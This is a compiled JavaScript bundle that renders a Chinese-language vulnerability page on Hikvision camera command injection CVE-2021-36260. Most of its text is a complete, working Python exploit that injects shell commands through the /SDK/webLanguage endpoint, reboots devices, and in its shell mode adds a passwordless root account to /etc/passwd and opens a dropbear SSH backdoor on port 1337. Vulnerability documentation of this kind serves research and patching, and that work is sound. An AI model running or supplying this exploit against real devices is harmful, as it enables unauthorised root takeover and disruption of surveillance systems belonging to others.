{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{1776:function(e,t,n){\"use strict\";n.r(t);var r=n(56),s=Object(r.a)({},(function(){var e=this,t=e.$createElement,r=e._self._c||t;return r(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":e.$parent.slotKey}},[r(\"h1\",{attrs:{id:\"hikvision-ds-ids-ipc-等设备-远程命令执行漏洞-cve-2021-36260\"}},[r(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#hikvision-ds-ids-ipc-等设备-远程命令执行漏洞-cve-2021-36260\"}},[e._v(\"#\")]),e._v(\" HIKVISION DS/IDS/IPC 等设备 远程命令执行漏洞 CVE-2021-36260\")]),e._v(\" \"),r(\"h2\",{attrs:{id:\"漏洞描述\"}},[r(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[e._v(\"#\")]),e._v(\" 漏洞描述\")]),e._v(\" \"),r(\"p\",[e._v(\"海康威视部分产品中的web模块存在一个命令注入漏洞，由于对输入参数校验不充分，攻击者可以发送带有恶意命令的报文到受影响设备，成功利用此漏洞可以导致命令执行。海康威视已发布版本修复该漏洞\")]),e._v(\" \"),r(\"h2\",{attrs:{id:\"漏洞影响\"}},[r(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[e._v(\"#\")]),e._v(\" 漏洞影响\")]),e._v(\" \"),r(\"p\",[r(\"img\",{attrs:{src:n(737),alt:\"img\"}})]),e._v(\" \"),r(\"p\",[r(\"img\",{attrs:{src:n(738),alt:\"img\"}})]),e._v(\" \"),r(\"p\",[r(\"img\",{attrs:{src:n(739),alt:\"img\"}})]),e._v(\" \"),r(\"h2\",{attrs:{id:\"网络测绘\"}},[r(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[e._v(\"#\")]),e._v(\" 网络测绘\")]),e._v(\" \"),r(\"ul\",[r(\"li\",[e._v('✅\"671-1e0-587ec4a1\"')])]),e._v(\" \"),r(\"h2\",{attrs:{id:\"漏洞复现\"}},[r(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[e._v(\"#\")]),e._v(\" 漏洞复现\")]),e._v(\" \"),r(\"p\",[e._v(\"登录页面\")]),e._v(\" \"),r(\"p\",[r(\"img\",{attrs:{src:n(740),alt:\"img\"}})]),e._v(\" \"),r(\"p\",[e._v(\"使用EXP命令执行\")]),e._v(\" \"),r(\"p\",[r(\"img\",{attrs:{src:n(741),alt:\"img\"}})]),e._v(\" \"),r(\"h2\",{attrs:{id:\"漏洞poc\"}},[r(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞poc\"}},[e._v(\"#\")]),e._v(\" 漏洞POC\")]),e._v(\" \"),r(\"div\",{staticClass:\"language-php extra-class\"},[r(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[r(\"code\",[e._v(\"# Exploit Title: Hikvision Web Server Build 210702 - Command Injection\\n# Exploit Author: bashis\\n# Vendor Homepage: https://www.hikvision.com/\\n# Version: 1.0\\n# CVE: CVE-2021-36260\\n# Reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html\\n\\n# All credit to Watchful_IP\\n\\n#!/usr/bin/env python3\\n\\n\\\"\\\"\\\"\\nNote:\\n1)  This code will _not_ verify if remote is Hikvision device or not.\\n2)  Most of my interest in this code has been concentrated on how to\\n    reliably detect vulnerable and/or exploitable devices.\\n    Some devices are easy to detect, verify and exploit the vulnerability,\\n    other devices may be vulnerable but not so easy to verify and exploit.\\n    I think the combined verification code should have very high accuracy.\\n3)  'safe check' (--check) will try write and read for verification\\n    'unsafe check' (--reboot) will try reboot the device for verification\\n\\n[Examples]\\nSafe vulnerability/verify check:\\n    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check\\n\\nSafe and unsafe vulnerability/verify check:\\n(will only use 'unsafe check' if not verified with 'safe check')\\n    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --check --reboot\\n\\nUnsafe vulnerability/verify check:\\n    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --reboot\\n\\nLaunch and connect to SSH shell:\\n    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shell\\n\\nExecute command:\\n    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd \\\"ls -l\\\"\\n\\nExecute blind command:\\n    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind \\\"reboot\\\"\\n\\n$./CVE-2021-36260.py -h\\n[*] Hikvision CVE-2021-36260\\n[*] PoC by bashis \"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"<\")]),e._v(\"mcw\")]),e._v(\" \"),r(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[e._v(\"noemail\")]),e._v(\" \"),r(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[e._v(\"eu\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\" (2021)\\nusage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]\\n                         [--reboot] [--shell] [--cmd CMD]\\n                         [--cmd_blind CMD_BLIND] [--noverify]\\n                         [--proto {http,https}]\\n\\noptional arguments:\\n  -h, --help            show this help message and exit\\n  --rhost RHOST         Remote Target Address (IP/FQDN)\\n  --rport RPORT         Remote Target Port\\n  --check               Check if vulnerable\\n  --reboot              Reboot if vulnerable\\n  --shell               Launch SSH shell\\n  --cmd CMD             execute cmd (i.e: \\\"ls -l\\\")\\n  --cmd_blind CMD_BLIND\\n                        execute blind cmd (i.e: \\\"reboot\\\")\\n  --noverify            Do not verify if vulnerable\\n  --proto {http,https}  Protocol used\\n$\\n\\\"\\\"\\\"\\n\\nimport os\\nimport argparse\\nimport time\\n\\nimport requests\\nfrom requests import packages\\nfrom requests.packages import urllib3\\nfrom requests.packages.urllib3 import exceptions\\n\\n\\nclass Http(object):\\n    def __init__(self, rhost, rport, proto, timeout=60):\\n        super(Http, self).__init__()\\n\\n        self.rhost = rhost\\n        self.rport = rport\\n        self.proto = proto\\n        self.timeout = timeout\\n\\n        self.remote = None\\n        self.uri = None\\n\\n        \\\"\\\"\\\" Most devices will use self-signed certificates, suppress any warnings \\\"\\\"\\\"\\n        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\\n\\n        self.remote = requests.Session()\\n\\n        self._init_uri()\\n\\n        self.remote.headers.update({\\n            'Host': f'{self.rhost}:{self.rport}',\\n            'Accept': '*/*',\\n            'X-Requested-With': 'XMLHttpRequest',\\n            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\\n            'Accept-Encoding': 'gzip, deflate',\\n            'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8',\\n        })\\n        \\\"\\\"\\\"\\n        self.remote.proxies.update({\\n            # 'http': 'http://127.0.0.1:8080',\\n        })\\n        \\\"\\\"\\\"\\n\\n    def send(self, url=None, query_args=None, timeout=5):\\n\\n        if query_args:\\n            \\\"\\\"\\\"Some devices can handle more, others less, 22 bytes seems like a good compromise\\\"\\\"\\\"\\n            if len(query_args) > 22:\\n                print(f'[!] Error: Command \\\"{query_args}\\\" to long ({len(query_args)})')\\n                return None\\n\\n        \\\"\\\"\\\"This weird code will try automatically switch between http/https\\n        and update Host\\n        \\\"\\\"\\\"\\n        try:\\n            if url and not query_args:\\n                return self.get(url, timeout)\\n            else:\\n                data = self.put('/SDK/webLanguage', query_args, timeout)\\n        except requests.exceptions.ConnectionError:\\n            self.proto = 'https' if self.proto == 'http' else 'https'\\n            self._init_uri()\\n            try:\\n                if url and not query_args:\\n                    return self.get(url, timeout)\\n                else:\\n                    data = self.put('/SDK/webLanguage', query_args, timeout)\\n            except requests.exceptions.ConnectionError:\\n                return None\\n        except requests.exceptions.RequestException:\\n            return None\\n        except KeyboardInterrupt:\\n            return None\\n\\n        \\\"\\\"\\\"302 when requesting http on https enabled device\\\"\\\"\\\"\\n\\n        if data.status_code == 302:\\n            redirect = data.headers.get('Location')\\n            self.uri = redirect[:redirect.rfind('/')]\\n            self._update_host()\\n            if url and not query_args:\\n                return self.get(url, timeout)\\n            else:\\n                data = self.put('/SDK/webLanguage', query_args, timeout)\\n\\n        return data\\n\\n    def _update_host(self):\\n        if not self.remote.headers.get('Host') == self.uri[self.uri.rfind('://') + 3:]:\\n            self.remote.headers.update({\\n                'Host': self.uri[self.uri.rfind('://') + 3:],\\n            })\\n\\n    def _init_uri(self):\\n        self.uri = '{proto}://{rhost}:{rport}'.format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))\\n\\n    def put(self, url, query_args, timeout):\\n        \\\"\\\"\\\"Command injection in the \"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"<\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(' tag\"\"\"\\n        query_args = \\''),r(\"span\",{pre:!0,attrs:{class:\"token php language-php\"}},[r(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[e._v(\"<?\")]),e._v(\"xml version\"),r(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[e._v(\"=\")]),r(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[e._v('\"1.0\"')]),e._v(\" encoding\"),r(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[e._v(\"=\")]),r(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[e._v('\"UTF-8\"')]),r(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[e._v(\"?>\")])]),e._v(\"' \\\\\\n                     f'\"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"<\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\"$({query_args})\"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"</\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v('\\'\\n        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)\\n\\n    def get(self, url, timeout):\\n        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)\\n\\n\\ndef check(remote, args):\\n    \"\"\"\\n    status_code == 200 (OK);\\n        Verified vulnerable and exploitable\\n    status_code == 500 (Internal Server Error);\\n        Device may be vulnerable, but most likely not\\n        The SDK webLanguage tag is there, but generate status_code 500 when language not found\\n        I.e. Exist: '),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"<\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\"en\"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"</\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\" (200), not exist: \"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"<\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\"EN\"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"</\")]),e._v(\"language\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\" (500)\\n        (Issue: Could also be other directory than 'webLib', r/o FS etc...)\\n    status_code == 401 (Unauthorized);\\n        Defiantly not vulnerable\\n    \\\"\\\"\\\"\\n    if args.noverify:\\n        print(f'[*] Not verifying remote \\\"{args.rhost}:{args.rport}\\\"')\\n        return True\\n\\n    print(f'[*] Checking remote \\\"{args.rhost}:{args.rport}\\\"')\\n\\n    data = remote.send(url='/', query_args=None)\\n    if data is None:\\n        print(f'[-] Cannot establish connection to \\\"{args.rhost}:{args.rport}\\\"')\\n        return None\\n    print('[i] ETag:', data.headers.get('ETag'))\\n\\n    data = remote.send(query_args='>webLib/c')\\n    if data is None or data.status_code == 404:\\n        print(f'[-] \\\"{args.rhost}:{args.rport}\\\" do not looks like Hikvision')\\n        return False\\n    status_code = data.status_code\\n\\n    data = remote.send(url='/c', query_args=None)\\n    if not data.status_code == 200:\\n        \\\"\\\"\\\"We could not verify command injection\\\"\\\"\\\"\\n        if status_code == 500:\\n            print(f'[-] Could not verify if vulnerable (Code: {status_code})')\\n            if args.reboot:\\n                return check_reboot(remote, args)\\n        else:\\n            print(f'[+] Remote is not vulnerable (Code: {status_code})')\\n        return False\\n\\n    print('[!] Remote is verified exploitable')\\n    return True\\n\\n\\ndef check_reboot(remote, args):\\n    \\\"\\\"\\\"\\n    We sending 'reboot', wait 2 sec, then checking with GET request.\\n    - if there is data returned, we can assume remote is not vulnerable.\\n    - If there is no connection or data returned, we can assume remote is vulnerable.\\n    \\\"\\\"\\\"\\n    if args.check:\\n        print('[i] Checking if vulnerable with \\\"reboot\\\"')\\n    else:\\n        print(f'[*] Checking remote \\\"{args.rhost}:{args.rport}\\\" with \\\"reboot\\\"')\\n    remote.send(query_args='reboot')\\n    time.sleep(2)\\n    if not remote.send(url='/', query_args=None):\\n        print('[!] Remote is vulnerable')\\n        return True\\n    else:\\n        print('[+] Remote is not vulnerable')\\n        return False\\n\\n\\ndef cmd(remote, args):\\n    if not check(remote, args):\\n        return False\\n    data = remote.send(query_args=f'{args.cmd}>webLib/x')\\n    if data is None:\\n        return False\\n\\n    data = remote.send(url='/x', query_args=None)\\n    if data is None or not data.status_code == 200:\\n        print(f'[!] Error execute cmd \\\"{args.cmd}\\\"')\\n        return False\\n    print(data.text)\\n    return True\\n\\n\\ndef cmd_blind(remote, args):\\n    \\\"\\\"\\\"\\n    Blind command injection\\n    \\\"\\\"\\\"\\n    if not check(remote, args):\\n        return False\\n    data = remote.send(query_args=f'{args.cmd_blind}')\\n    if data is None or not data.status_code == 500:\\n        print(f'[-] Error execute cmd \\\"{args.cmd_blind}\\\"')\\n        return False\\n    print(f'[i] Try execute blind cmd \\\"{args.cmd_blind}\\\"')\\n    return True\\n\\n\\ndef shell(remote, args):\\n    if not check(remote, args):\\n        return False\\n    data = remote.send(url='/N', query_args=None)\\n\\n    if data.status_code == 404:\\n        print(f'[i] Remote \\\"{args.rhost}\\\" not pwned, pwning now!')\\n        data = remote.send(query_args='echo -n P::0:0:W>N')\\n        if data.status_code == 401:\\n            print(data.headers)\\n            print(data.text)\\n            return False\\n        remote.send(query_args='echo :/:/bin/sh>>N')\\n        remote.send(query_args='cat N>>/etc/passwd')\\n        remote.send(query_args='dropbear -R -B -p 1337')\\n        remote.send(query_args='cat N>webLib/N')\\n    else:\\n        print(f'[i] Remote \\\"{args.rhost}\\\" already pwned')\\n\\n    print(f'[*] Trying SSH to {args.rhost} on port 1337')\\n    os.system(f'stty echo; stty iexten; stty icanon; \\\\\\n    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null \\\\\\n    P@{args.rhost} -p 1337')\\n\\n\\ndef main():\\n    print('[*] Hikvision CVE-2021-36260\\\\n[*] PoC by bashis \"),r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token tag\"}},[r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\"<\")]),e._v(\"mcw\")]),e._v(\" \"),r(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[e._v(\"noemail\")]),e._v(\" \"),r(\"span\",{pre:!0,attrs:{class:\"token attr-name\"}},[e._v(\"eu\")]),r(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[e._v(\">\")])]),e._v(\" (2021)')\\n\\n    parser = argparse.ArgumentParser()\\n    parser.add_argument('--rhost', required=True, type=str, default=None, help='Remote Target Address (IP/FQDN)')\\n    parser.add_argument('--rport', required=False, type=int, default=80, help='Remote Target Port')\\n    parser.add_argument('--check', required=False, default=False, action='store_true', help='Check if vulnerable')\\n    parser.add_argument('--reboot', required=False, default=False, action='store_true', help='Reboot if vulnerable')\\n    parser.add_argument('--shell', required=False, default=False, action='store_true', help='Launch SSH shell')\\n    parser.add_argument('--cmd', required=False, type=str, default=None, help='execute cmd (i.e: \\\"ls -l\\\")')\\n    parser.add_argument('--cmd_blind', required=False, type=str, default=None, help='execute blind cmd (i.e: \\\"reboot\\\")')\\n    parser.add_argument(\\n        '--noverify', required=False, default=False, action='store_true', help='Do not verify if vulnerable'\\n    )\\n    parser.add_argument(\\n        '--proto', required=False, type=str, choices=['http', 'https'], default='http', help='Protocol used'\\n    )\\n    args = parser.parse_args()\\n\\n    remote = Http(args.rhost, args.rport, args.proto)\\n\\n    try:\\n        if args.shell:\\n            shell(remote, args)\\n        elif args.cmd:\\n            cmd(remote, args)\\n        elif args.cmd_blind:\\n            cmd_blind(remote, args)\\n        elif args.check:\\n            check(remote, args)\\n        elif args.reboot:\\n            check_reboot(remote, args)\\n        else:\\n            parser.parse_args(['-h'])\\n    except KeyboardInterrupt:\\n        return False\\n\\n\\nif __name__ == '__main__':\\n    main()\\n            \\n\")])])])])}),[],!1,null,null,null);t.default=s.exports},737:function(e,t,n){e.exports=n.p+\"assets/img/1636440207154-391ffa57-e7df-43d7-99bd-698e16c82009-20220314132135600.3ff526d7.png\"},738:function(e,t,n){e.exports=n.p+\"assets/img/1636440217967-a684e549-f12a-458e-a9f9-730cf2b9aae1-20220314132135704.8cc6f749.png\"},739:function(e,t,n){e.exports=n.p+\"assets/img/1636440225690-efe1f7a2-b236-4547-9fec-1fcba1f9b7ac-20220314132135762.488b9434.png\"},740:function(e,t,n){e.exports=n.p+\"assets/img/1636440258216-48d3dfeb-e847-462d-81c0-afbc6e4a4bb3-20220314132135952.723dca00.png\"},741:function(e,t,n){e.exports=n.p+\"assets/img/1636440290269-a565a0d9-4abe-45ce-b8a6-75d2d355b252-20220314132135536.fa316e7a.png\"}}]);","extractedComments":[]}